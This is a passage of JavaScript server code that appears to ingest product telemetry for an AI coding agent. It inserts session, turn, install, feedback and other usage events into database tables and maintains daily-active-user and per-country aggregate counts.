  const turnDetailColumns = await getTurnDetailColumns(env);
  const installDetailColumns = await getInstallDetailColumns(env);
  const common = commonEventEntries(body, columns);

  if (body.event === "session_concurrency") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id], ["event", body.event], ["version", body.version],
      ["os", body.os], ["arch", body.arch], ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "todo_session") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertTodoSessionDetails(env, body, await getTodoSessionDetailColumns(env));
    }
    return;
  }

  if (body.event === "discovery") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertDiscoveryDetails(env, body, await getDiscoveryDetailColumns(env));
    }
    return;
  }

  if (WEB_EVENTS.includes(body.event)) {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertWebDetails(env, body, await getWebDetailColumns(env));
    }
    return;
  }

  if (SUBSCRIPTION_EVENTS.includes(body.event)) {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["account_id", body.account_id || null],
      ["tier", body.tier || null],
      // Subscription events reuse the generic model_start column for the
      // routed model (new event types; no historical rows are re-read).
      ["model_start", body.model || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "install_funnel") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertInstallDetails(env, body, installDetailColumns);
    }
    return;
  }

  if (body.event === "install") {
    const inserted = await insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name)));
    if (inserted && body.conversion_id) {
      await insertInstallDetails(env, {
        ...body,
        stage: "first_run",
        outcome: "success",
        source: "cli",
      }, installDetailColumns);
    }
    return;
  }

  if (body.event === "upgrade") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["from_version", body.from_version || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (DESKTOP_EVENTS.includes(body.event)) {
    const inserted = await insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["from_version", body.event === "desktop_active" ? null : desktopToken(body.from_version, /[^0-9A-Za-z.+_-]/g)],
      ...common,
    ].filter(([name]) => columns.has(name)));
    if (inserted && body.event === "desktop_update" && body.event_id) {
      try {
        await insertDynamic(env, "desktop_update_details", [
          ["event_id", body.event_id],
          ["install_kind", desktopToken(body.install_kind)],
          ["update_outcome", desktopToken(body.update_outcome)],
          ["update_failure_stage", desktopToken(body.update_failure_stage)],
        ]);
      } catch (err) {
        console.warn("desktop_update_details insert failed", err?.message || err);
      }
    }
    return inserted;
  }

  if (body.event === "auth_success") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["auth_provider", body.auth_provider || null],
      ["auth_method", body.auth_method || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "onboarding_step") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["step", body.step || null],
      ["auth_provider", body.auth_provider || null],
      ["auth_method", body.auth_method || null],
      ["auth_failure_reason", body.auth_failure_reason || null],
      ["milestone_elapsed_ms", body.milestone_elapsed_ms || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "telemetry_opt_out") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["step", body.step || "telemetry_settings"],
      ...common.filter(([name]) => name !== "session_id"),
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "feedback") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["feedback_rating", body.feedback_rating || null],
      ["feedback_reason", body.feedback_reason || null],
      ["feedback_text", body.feedback_text || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "session_start") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["provider_start", body.provider_start || null],
      ["model_start", body.model_start || null],
      ["session_start_hour_utc", body.session_start_hour_utc ?? null],
      ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
      ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
      ["sessions_started_24h", body.sessions_started_24h || 0],
      ["sessions_started_7d", body.sessions_started_7d || 0],
      ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
      ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
      ...common,
    ];
    if (columns.has("resumed_session")) {
      values.push(["resumed_session", boolToInt(body.resumed_session)]);
    }
    return insertEventRow(env, body, values.filter(([name]) => columns.has(name)));
  }

  if (body.event === "prompt_submitted") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["turn_index", body.turn_index ?? null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "turn_end") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["turn_index", body.turn_index ?? null],
      ["turn_started_ms", body.turn_started_ms ?? null],
      ["turn_active_duration_ms", body.turn_active_duration_ms ?? null],
      ["idle_before_turn_ms", body.idle_before_turn_ms ?? null],
      ["idle_after_turn_ms", body.idle_after_turn_ms ?? null],
      ["input_tokens", body.input_tokens || 0],
      ["output_tokens", body.output_tokens || 0],
      ["cache_read_input_tokens", body.cache_read_input_tokens || 0],
      ["cache_creation_input_tokens", body.cache_creation_input_tokens || 0],
      ["total_tokens", body.total_tokens || 0],
      ["turn_success", boolToInt(body.turn_success)],
      ["turn_abandoned", boolToInt(body.turn_abandoned)],
      ["turn_end_reason", body.turn_end_reason || null],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertTurnDetails(env, body, turnDetailColumns);
    }
    return;
  }

  if (["session_end", "session_crash"].includes(body.event)) {
    const errors = body.errors || {};
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["provider_start", body.provider_start || null],
      ["provider_end", body.provider_end || null],
      ["model_start", body.model_start || null],
      ["model_end", body.model_end || null],
      ["provider_switches", body.provider_switches || 0],
      ["model_switches", body.model_switches || 0],
      ["duration_mins", body.duration_mins || 0],
      ["duration_secs", body.duration_secs || 0],
      ["turns", body.turns || 0],
      ["had_user_prompt", boolToInt(body.had_user_prompt)],
      ["had_assistant_response", boolToInt(body.had_assistant_response)],
      ["assistant_responses", body.assistant_responses || 0],
      ["first_assistant_response_ms", body.first_assistant_response_ms || null],
      ["first_tool_call_ms", body.first_tool_call_ms || null],
      ["first_tool_success_ms", body.first_tool_success_ms || null],
      ["tool_calls", body.tool_calls || 0],
      ["tool_failures", body.tool_failures || 0],
      ["executed_tool_calls", body.executed_tool_calls || 0],
      ["executed_tool_successes", body.executed_tool_successes || 0],
      ["executed_tool_failures", body.executed_tool_failures || 0],
      ["tool_latency_total_ms", body.tool_latency_total_ms || 0],
      ["tool_latency_max_ms", body.tool_latency_max_ms || 0],
      ["file_write_calls", body.file_write_calls || 0],
      ["tests_run", body.tests_run || 0],
      ["tests_passed", body.tests_passed || 0],
      ["input_tokens", body.input_tokens || 0],
      ["output_tokens", body.output_tokens || 0],
      ["cache_read_input_tokens", body.cache_read_input_tokens || 0],
      ["cache_creation_input_tokens", body.cache_creation_input_tokens || 0],
      ["total_tokens", body.total_tokens || 0],
      ["feature_memory_used", boolToInt(body.feature_memory_used)],
      ["feature_swarm_used", boolToInt(body.feature_swarm_used)],
      ["feature_web_used", boolToInt(body.feature_web_used)],
      ["feature_email_used", boolToInt(body.feature_email_used)],
      ["feature_mcp_used", boolToInt(body.feature_mcp_used)],
      ["feature_side_panel_used", boolToInt(body.feature_side_panel_used)],
      ["feature_goal_used", boolToInt(body.feature_goal_used)],
      ["feature_selfdev_used", boolToInt(body.feature_selfdev_used)],
      ["feature_background_used", boolToInt(body.feature_background_used)],
      ["feature_subagent_used", boolToInt(body.feature_subagent_used)],
      ["unique_mcp_servers", body.unique_mcp_servers || 0],
      ["session_success", boolToInt(body.session_success)],
      ["abandoned_before_response", boolToInt(body.abandoned_before_response)],
      ["session_stop_reason", body.session_stop_reason || null],
      ["agent_role", body.agent_role || null],
      ["parent_session_id", body.parent_session_id || null],
      ["agent_active_ms_total", body.agent_active_ms_total || 0],
      ["agent_model_ms_total", body.agent_model_ms_total || 0],
      ["agent_tool_ms_total", body.agent_tool_ms_total || 0],
      ["session_idle_ms_total", body.session_idle_ms_total || 0],
      ["agent_blocked_ms_total", body.agent_blocked_ms_total || 0],
      ["time_to_first_agent_action_ms", body.time_to_first_agent_action_ms ?? null],
      ["time_to_first_useful_action_ms", body.time_to_first_useful_action_ms ?? null],
      ["spawned_agent_count", body.spawned_agent_count || 0],
      ["background_task_count", body.background_task_count || 0],
      ["background_task_completed_count", body.background_task_completed_count || 0],
      ["subagent_task_count", body.subagent_task_count || 0],
      ["subagent_success_count", body.subagent_success_count || 0],
      ["swarm_task_count", body.swarm_task_count || 0],
      ["swarm_success_count", body.swarm_success_count || 0],
      ["user_cancelled_count", body.user_cancelled_count || 0],
      ["transport_https", body.transport_https || 0],
      ["transport_persistent_ws_fresh", body.transport_persistent_ws_fresh || 0],
      ["transport_persistent_ws_reuse", body.transport_persistent_ws_reuse || 0],
      ["transport_cli_subprocess", body.transport_cli_subprocess || 0],
      ["transport_native_http2", body.transport_native_http2 || 0],
      ["transport_other", body.transport_other || 0],
      ["session_start_hour_utc", body.session_start_hour_utc ?? null],
      ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
      ["session_end_hour_utc", body.session_end_hour_utc ?? null],
      ["session_end_weekday_utc", body.session_end_weekday_utc ?? null],
      ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
      ["sessions_started_24h", body.sessions_started_24h || 0],
      ["sessions_started_7d", body.sessions_started_7d || 0],
      ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
      ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
      ["max_concurrent_sessions", rawConcurrencyScalar(body.max_concurrent_sessions)],
      ["multi_sessioned", rawConcurrencyScalar(body.multi_sessioned)],
      ["resumed_session", boolToInt(body.resumed_session)],
      ["end_reason", body.end_reason || null],
      ["error_provider_timeout", errors.provider_timeout || 0],
      ["error_auth_failed", errors.auth_failed || 0],
      ["error_tool_error", errors.tool_error || 0],
      ["error_mcp_error", errors.mcp_error || 0],
      ["error_rate_limited", errors.rate_limited || 0],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertSessionDetails(env, body, sessionDetailColumns);
    }
    return;
  }
}

async function insertEventRow(env, body, entries) {
  const result = await insertDynamic(env, "events", entries);
  const inserted = wasInserted(result);
  if (inserted) {
    await recordDailyActivity(env, body);
  }
  return inserted;
}

function wasInserted(result) {
  return (result?.meta?.changes ?? result?.changes ?? 0) > 0;
}

async function insertTurnDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["turn_index", body.turn_index ?? null],
    ["turn_started_ms", body.turn_started_ms ?? null],
    ["turn_active_duration_ms", body.turn_active_duration_ms ?? null],
    ["idle_before_turn_ms", body.idle_before_turn_ms ?? null],
    ["idle_after_turn_ms", body.idle_after_turn_ms ?? null],
    ["turn_success", boolToInt(body.turn_success)],
    ["turn_abandoned", boolToInt(body.turn_abandoned)],
    ["turn_end_reason", body.turn_end_reason || null],
    ["input_tokens", body.input_tokens || 0],
    ["output_tokens", body.output_tokens || 0],
    ["total_tokens", body.total_tokens || 0],
    ["assistant_responses", body.assistant_responses || 0],
    ["first_assistant_response_ms", body.first_assistant_response_ms ?? null],
    ["first_tool_call_ms", body.first_tool_call_ms ?? null],
    ["first_tool_success_ms", body.first_tool_success_ms ?? null],
    ["first_file_edit_ms", body.first_file_edit_ms ?? null],
    ["first_test_pass_ms", body.first_test_pass_ms ?? null],
    ["tool_calls", body.tool_calls || 0],
    ["tool_failures", body.tool_failures || 0],
    ["executed_tool_calls", body.executed_tool_calls || 0],
    ["executed_tool_successes", body.executed_tool_successes || 0],
    ["executed_tool_failures", body.executed_tool_failures || 0],
    ["tool_latency_total_ms", body.tool_latency_total_ms || 0],
    ["tool_latency_max_ms", body.tool_latency_max_ms || 0],
    ["file_write_calls", body.file_write_calls || 0],
    ["tests_run", body.tests_run || 0],
    ["tests_passed", body.tests_passed || 0],
    ["feature_memory_used", boolToInt(body.feature_memory_used)],
    ["feature_swarm_used", boolToInt(body.feature_swarm_used)],
    ["feature_web_used", boolToInt(body.feature_web_used)],
    ["feature_email_used", boolToInt(body.feature_email_used)],
    ["feature_mcp_used", boolToInt(body.feature_mcp_used)],
    ["feature_side_panel_used", boolToInt(body.feature_side_panel_used)],
    ["feature_goal_used", boolToInt(body.feature_goal_used)],
    ["feature_selfdev_used", boolToInt(body.feature_selfdev_used)],
    ["feature_background_used", boolToInt(body.feature_background_used)],
    ["feature_subagent_used", boolToInt(body.feature_subagent_used)],
    ["unique_mcp_servers", body.unique_mcp_servers || 0],
    ["tool_cat_read_search", body.tool_cat_read_search || 0],
    ["tool_cat_write", body.tool_cat_write || 0],
    ["tool_cat_shell", body.tool_cat_shell || 0],
    ["tool_cat_web", body.tool_cat_web || 0],
    ["tool_cat_memory", body.tool_cat_memory || 0],
    ["tool_cat_subagent", body.tool_cat_subagent || 0],
    ["tool_cat_swarm", body.tool_cat_swarm || 0],
    ["tool_cat_email", body.tool_cat_email || 0],
    ["tool_cat_side_panel", body.tool_cat_side_panel || 0],
    ["tool_cat_goal", body.tool_cat_goal || 0],
    ["tool_cat_mcp", body.tool_cat_mcp || 0],
    ["tool_cat_other", body.tool_cat_other || 0],
    ["tool_cat_todo", body.tool_cat_todo || 0],
    ["feature_todo_used", boolToInt(body.feature_todo_used)],
    ["todo_gate_ownership_count", body.todo_gate_ownership_count || 0],
    ["todo_gate_hill_count", body.todo_gate_hill_count || 0],
    ["todo_gate_completion_count", body.todo_gate_completion_count || 0],
    ["todo_gate_spike_count", body.todo_gate_spike_count || 0],
    ["workflow_chat_only", boolToInt(body.workflow_chat_only)],
    ["workflow_coding_used", boolToInt(body.workflow_coding_used)],
    ["workflow_research_used", boolToInt(body.workflow_research_used)],
    ["workflow_tests_used", boolToInt(body.workflow_tests_used)],
    ["workflow_background_used", boolToInt(body.workflow_background_used)],
    ["workflow_subagent_used", boolToInt(body.workflow_subagent_used)],
    ["workflow_swarm_used", boolToInt(body.workflow_swarm_used)],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, 'turn_details', values);
  }
}

async function recordDailyActivity(env, body) {
  // Country rollup covers every event family, including the ones that never
  // reach the DAU table (install, upgrade, web_pageview, ...).
  await recordCountryDaily(env, body);
  if (!["session_start", "prompt_submitted", "turn_end", "session_end", "session_crash"].includes(body.event)) {
    return;
  }

  const activityDate = new Date().toISOString().slice(0, 10);
  const meaningful = isMeaningfulLifecycleEvent(body) ? 1 : 0;
  // ci_release means the artifact was built by CI/CD, not that this execution
  // happened on a runner. Runtime automation is represented independently by
  // is_ci and CI-built official binaries still count as release usage.
  const release = ["release", "ci_release"].includes(body.build_channel) ? 1 : 0;
  const meaningfulRelease = meaningful && release ? 1 : 0;
  const isCi = boolToInt(body.is_ci);
  const sessionStartCount = body.event === "session_start" ? 1 : 0;
  const turnEndCount = body.event === "turn_end" ? 1 : 0;
  const sessionEndCount = body.event === "session_end" ? 1 : 0;
  const sessionCrashCount = body.event === "session_crash" ? 1 : 0;

  try {
    await env.DB.prepare(`
      INSERT INTO daily_active_users (
        activity_date,
        telemetry_id,
        raw_active,
        meaningful_active,
        release_active,
        meaningful_release_active,
        session_start_count,
        turn_end_count,
        session_end_count,
        session_crash_count,
        ci_active,
        last_is_ci,
        last_build_channel,
        last_country
      ) VALUES (?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(activity_date, telemetry_id) DO UPDATE SET
        last_seen_at = datetime('now'),
        raw_active = 1,
        meaningful_active = MAX(meaningful_active, excluded.meaningful_active),
        release_active = MAX(release_active, excluded.release_active),
        meaningful_release_active = MAX(meaningful_release_active, excluded.meaningful_release_active),
        session_start_count = session_start_count + excluded.session_start_count,
        turn_end_count = turn_end_count + excluded.turn_end_count,
        session_end_count = session_end_count + excluded.session_end_count,
        session_crash_count = session_crash_count + excluded.session_crash_count,
        ci_active = MAX(ci_active, excluded.ci_active),
        last_is_ci = excluded.last_is_ci,
        last_build_channel = COALESCE(excluded.last_build_channel, daily_active_users.last_build_channel),
        last_country = COALESCE(excluded.last_country, daily_active_users.last_country)
    `).bind(
      activityDate,
      body.id,
      meaningful,
      release,
      meaningfulRelease,
      sessionStartCount,
      turnEndCount,
      sessionEndCount,
      sessionCrashCount,
      isCi,
      isCi,
      body.build_channel || null,
      body.country || null,
    ).run();
  } catch (err) {
    // Older databases may not have the rollup migration yet. Do not reject the
    // canonical event insert, because raw events remain the source of truth.
    console.warn("daily activity rollup failed", err?.message || err);
  }
}

// Durable per-day country x event counts. Aggregate only (no telemetry_id), so
// it survives retention pruning and cannot be used to profile an individual.
async function recordCountryDaily(env, body) {
  if (!body.country) {
    return;
  }
  const activityDate = new Date().toISOString().slice(0, 10);
  try {
    await env.DB.prepare(`
      INSERT INTO country_daily (activity_date, country, event, is_ci, event_count)
      VALUES (?, ?, ?, ?, 1)
      ON CONFLICT(activity_date, country, event, is_ci) DO UPDATE SET
        event_count = event_count + 1,
        last_seen_at = datetime('now')
    `).bind(activityDate, body.country, body.event, boolToInt(body.is_ci)).run();
  } catch (err) {
    // Databases predating migration 0022 have no country_daily table; never
    // fail the canonical event insert over the geo rollup.
    console.warn("country rollup failed", err?.message || err);
  }
}

function isMeaningfulLifecycleEvent(body) {
  const errors = body.errors || {};
  if (body.event === "prompt_submitted") {
    return true;
  }
  if (["session_end", "session_crash"].includes(body.event)) {
    return (
      (body.turns || 0) > 0
      || boolToInt(body.had_user_prompt) > 0
      || boolToInt(body.had_assistant_response) > 0
      || (body.assistant_responses || 0) > 0
      || (body.tool_calls || 0) > 0
      || (body.executed_tool_calls || 0) > 0
      || (body.duration_secs || 0) > 0
      || (errors.provider_timeout || 0) > 0
      || (errors.auth_failed || 0) > 0
      || (errors.tool_error || 0) > 0
      || (errors.mcp_error || 0) > 0
      || (errors.rate_limited || 0) > 0
      || (body.provider_switches || 0) > 0
      || (body.model_switches || 0) > 0
    );
  }
  // A turn_end event only fires after a real user turn completes (a prompt was
  // submitted and the agent did work), so it is strong evidence of meaningful
  // activity even when the session_end/session_crash event is lost (process
  // killed, machine shutdown, network drop on the final flush, or a session
  // still open at UTC midnight). Counting it here avoids undercounting the
  // headline meaningful DAU for those users.
  if (body.event === "turn_end") {
    return (
      (body.assistant_responses || 0) > 0
      || (body.tool_calls || 0) > 0
      || (body.executed_tool_calls || 0) > 0
      || (body.file_write_calls || 0) > 0
      || (body.tests_run || 0) > 0
      || boolToInt(body.turn_success) > 0
    );
  }
  return false;
}

async function insertSessionDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["session_start_hour_utc", body.session_start_hour_utc ?? null],
    ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
    ["session_end_hour_utc", body.session_end_hour_utc ?? null],
    ["session_end_weekday_utc", body.session_end_weekday_utc ?? null],
    ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
    ["sessions_started_24h", body.sessions_started_24h || 0],
    ["sessions_started_7d", body.sessions_started_7d || 0],
    ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
    ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
    ["max_concurrent_sessions", rawConcurrencyScalar(body.max_concurrent_sessions)],
    ["multi_sessioned", rawConcurrencyScalar(body.multi_sessioned)],
    ["first_file_edit_ms", body.first_file_edit_ms || null],
    ["first_test_pass_ms", body.first_test_pass_ms || null],
    ["tool_cat_read_search", body.tool_cat_read_search || 0],
    ["tool_cat_write", body.tool_cat_write || 0],
    ["tool_cat_shell", body.tool_cat_shell || 0],
    ["tool_cat_web", body.tool_cat_web || 0],
    ["tool_cat_memory", body.tool_cat_memory || 0],
    ["tool_cat_subagent", body.tool_cat_subagent || 0],
    ["tool_cat_swarm", body.tool_cat_swarm || 0],
    ["tool_cat_email", body.tool_cat_email || 0],
    ["tool_cat_side_panel", body.tool_cat_side_panel || 0],
    ["tool_cat_goal", body.tool_cat_goal || 0],
    ["tool_cat_mcp", body.tool_cat_mcp || 0],
    ["tool_cat_other", body.tool_cat_other || 0],
    ["tool_cat_todo", body.tool_cat_todo || 0],
    ["feature_todo_used", boolToInt(body.feature_todo_used)],
    ["todo_gate_ownership_count", body.todo_gate_ownership_count || 0],
    ["todo_gate_hill_count", body.todo_gate_hill_count || 0],
    ["todo_gate_completion_count", body.todo_gate_completion_count || 0],
    ["todo_gate_spike_count", body.todo_gate_spike_count || 0],
    ["command_login_used", boolToInt(body.command_login_used)],
    ["command_model_used", boolToInt(body.command_model_used)],
    ["command_usage_used", boolToInt(body.command_usage_used)],
    ["command_resume_used", boolToInt(body.command_resume_used)],
    ["command_memory_used", boolToInt(body.command_memory_used)],
    ["command_swarm_used", boolToInt(body.command_swarm_used)],
    ["command_goal_used", boolToInt(body.command_goal_used)],
    ["command_selfdev_used", boolToInt(body.command_selfdev_used)],
    ["command_feedback_used", boolToInt(body.command_feedback_used)],
    ["command_other_used", boolToInt(body.command_other_used)],
    ["workflow_chat_only", boolToInt(body.workflow_chat_only)],
    ["workflow_coding_used", boolToInt(body.workflow_coding_used)],
    ["workflow_research_used", boolToInt(body.workflow_research_used)],
    ["workflow_tests_used", boolToInt(body.workflow_tests_used)],
    ["workflow_background_used", boolToInt(body.workflow_background_used)],
    ["workflow_subagent_used", boolToInt(body.workflow_subagent_used)],
    ["workflow_swarm_used", boolToInt(body.workflow_swarm_used)],
    ["project_repo_present", boolToInt(body.project_repo_present)],
    ["project_lang_rust", boolToInt(body.project_lang_rust)],
    ["project_lang_js_ts", boolToInt(body.project_lang_js_ts)],
    ["project_lang_python", boolToInt(body.project_lang_python)],
    ["project_lang_go", boolToInt(body.project_lang_go)],
    ["project_lang_markdown", boolToInt(body.project_lang_markdown)],
    ["project_lang_mixed", boolToInt(body.project_lang_mixed)],
    ["days_since_install", body.days_since_install || null],
    ["active_days_7d", body.active_days_7d || 0],
    ["active_days_30d", body.active_days_30d || 0],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, 'session_details', values);
  }
}

function commonEventEntries(body, columns) {
  const values = [];
  if (columns.has("event_id")) {
    values.push(["event_id", body.event_id || null]);
  }
  if (columns.has("session_id")) {
    values.push(["session_id", body.session_id || null]);
  }
  if (columns.has("schema_version")) {
    values.push(["schema_version", body.schema_version || 1]);
  }
  if (columns.has("build_channel")) {
    values.push(["build_channel", body.build_channel || null]);
  }
  if (columns.has("is_git_checkout")) {
    values.push(["is_git_checkout", boolToInt(body.is_git_checkout)]);
  }
  if (columns.has("is_ci")) {
    values.push(["is_ci", boolToInt(body.is_ci)]);
  }
  if (columns.has("ran_from_cargo")) {
    values.push(["ran_from_cargo", boolToInt(body.ran_from_cargo)]);
  }
  return values;
}

// Desktop sends short tokens only. Re-sanitize server-side so a buggy or
// hostile client cannot store messages or paths: lowercase [a-z0-9_] (or the
// given disallowed-char pattern for versions), max 64 chars, null if empty.
function desktopToken(value, disallowed = null) {
  if (value == null) return null;
  let text = String(value).trim();
  text = disallowed
    ? text.replace(disallowed, "")
    : text.toLowerCase().replace(/[^a-z0-9_]+/g, "_").replace(/^_+|_+$/g, "");
  text = text.slice(0, 64);
  return text || null;
}

async function getEventColumns(env) {
  if (cachedEventColumns) {
    return cachedEventColumns;
  }
  const result = await env.DB.prepare("PRAGMA table_info(events)").all();
  cachedEventColumns = new Set((result.results || []).map((row) => row.name));
  return cachedEventColumns;
}

async function getSessionDetailColumns(env) {
  if (cachedSessionDetailColumns) {
    return cachedSessionDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(session_details)").all();
    cachedSessionDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedSessionDetailColumns = new Set();
  }
  return cachedSessionDetailColumns;
}

async function getTurnDetailColumns(env) {
  if (cachedTurnDetailColumns) {
    return cachedTurnDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(turn_details)").all();
    cachedTurnDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedTurnDetailColumns = new Set();
  }
  return cachedTurnDetailColumns;
}

async function getWebDetailColumns(env) {
  if (cachedWebDetailColumns) {
    return cachedWebDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(web_details)").all();
    cachedWebDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedWebDetailColumns = new Set();
  }
  return cachedWebDetailColumns;
}

async function getInstallDetailColumns(env) {
  if (cachedInstallDetailColumns) {
    return cachedInstallDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(install_details)").all();
    cachedInstallDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedInstallDetailColumns = new Set();
  }
  return cachedInstallDetailColumns;
}

async function getDiscoveryDetailColumns(env) {
  if (cachedDiscoveryDetailColumns) {
    return cachedDiscoveryDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(discovery_details)").all();
    cachedDiscoveryDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedDiscoveryDetailColumns = new Set();
  }
  return cachedDiscoveryDetailColumns;
}

async function getTodoSessionDetailColumns(env) {
  if (cachedTodoSessionDetailColumns) {
    return cachedTodoSessionDetailColumns;
  }
  try {
    const result = await env.DB.prepare("PRAGMA table_info(todo_session_details)").all();
    cachedTodoSessionDetailColumns = new Set((result.results || []).map((row) => row.name));
  } catch {
    cachedTodoSessionDetailColumns = new Set();
  }
  return cachedTodoSessionDetailColumns;
}

async function insertDiscoveryDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["request_id", body.request_id],
    ["phase", body.phase],
    ["category", body.category || null],
    ["selected_tool", body.selected_tool || null],
    ["outcome", body.outcome],
    ["failure_reason", body.failure_reason || null],
    ["http_status", body.http_status ?? null],
    ["latency_ms", body.latency_ms || 0],
    ["response_bytes", body.response_bytes ?? null],
    ["result_count", body.result_count ?? null],
    ["query_present", boolToInt(body.query_present)],
    ["reason_present", boolToInt(body.reason_present)],
    ["custom_endpoint", boolToInt(body.custom_endpoint)],
    ["benchmark_run", boolToInt(body.benchmark_run)],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "discovery_details", values);
  }
}

async function insertTodoSessionDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["correlation_id", body.correlation_id],
    ["session_end_reason", body.session_end_reason],
    ["todos_created", body.todos_created || 0],
    ["todos_completed", body.todos_completed || 0],
    ["todos_abandoned", body.todos_abandoned || 0],
    ["todo_updates", body.todo_updates || 0],
    ["groups_completed", body.groups_completed || 0],
    ["groups_total", body.groups_total || 0],
    ["max_todo_list_size", body.max_todo_list_size || 0],
    ["confidence_min", body.confidence_min ?? null],
    ["confidence_mean", body.confidence_mean ?? null],
    ["confidence_count", body.confidence_count || 0],
    ["completion_confidence_min", body.completion_confidence_min ?? null],
    ["completion_confidence_mean", body.completion_confidence_mean ?? null],
    ["completion_confidence_count", body.completion_confidence_count || 0],
    ["understands_user_intent_min", body.understands_user_intent_min ?? null],
    ["understands_user_intent_mean", body.understands_user_intent_mean ?? null],
    ["understands_user_intent_count", body.understands_user_intent_count || 0],
    ["closed_feedback_loop_min", body.closed_feedback_loop_min ?? null],
    ["closed_feedback_loop_mean", body.closed_feedback_loop_mean ?? null],
    ["closed_feedback_loop_count", body.closed_feedback_loop_count || 0],
